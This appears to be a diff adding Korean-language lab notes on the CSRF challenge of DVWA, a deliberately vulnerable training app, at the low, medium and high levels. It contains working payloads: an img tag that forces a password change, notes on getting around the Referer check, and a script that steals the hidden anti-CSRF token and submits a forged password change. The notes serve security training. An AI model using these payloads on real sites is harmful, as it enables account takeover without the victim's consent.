@@ -1,0 +1,61 @@
+low
+1. 비밀번호 변경
+
+2. 변경된 비밀번호 확인
+
+3. 요청을 보내야 하기에 비밀번호 변경 url만 입력
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=qwas&password_conf=qwas&Change=Change"/>
+(이미지 태그로 html파일을 만들어 해보니, 쿠키값이 안넘어감)
+
+4. 요청 후 비밀번호 변경 확인
+
+
+medium
+1. 비밀번호 변경 & 변경 확인
+
+2. 비밀번호 변경 url만 요청
+> 올바르지 않은 요청알람이 뜸
+> referrerpolicy="no-referrer" 태그로 리퍼러를 안보내보지만 안됨
+<meta name="referrer" content="no-referrer"> 메타 태그도 안됨
+
+3. 리퍼러에 다른 경로 추가 시도
+> 넘어갔으니, 리퍼러가 있어야 함
+
+4. dvwa의 경로에 비밀번호 변경 파일 생성 후, 실행
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=qwas&password_conf=qwas&Change=Change"/>
+
+
+high
+1. 비밀번호 변경 & 변경 확인
+
+2. 비밀번호 변경 url만 요청
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=qwas&password_conf=qwas&Change=Change"/>
+> 정상적인 요청과 비정상적인 요청 비교
+> user_token이 추가되어 있음
+> user_token을 랜덤으로 넣어봄 >> 안됨
+
+3. 코드에 있는 히든 user_token의 값을 가져올 스크립트 삽입
+콘솔로 추출이 되는지 확인
+document.querySelector('input[name="user_token"]').value;
+
+스크립트
+<script>
+// 토큰을 추출하기 위한 요청
+fetch('http://localhost/dvwa/vulnerabilities/csrf/index.php/')
+    .then(response => response.text())
+    .then(html => {
+        // user_token 추출
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
+        const token = doc.querySelector('input[name="user_token"]').value;
+
+        // 비밀번호 변경 URL 구성
+        const passwordChangeUrl = `http://localhost/dvwa/vulnerabilities/csrf/index.php/?password_new=1234&password_conf=1234&user_token=${token}&Change=Change`;
+
+        // 공격 실행
+        fetch(passwordChangeUrl);
+    })
+    .catch(err => console.error('Token extraction failed:', err));
+</script>
+
+4. 변경된 비밀번호로 로그인
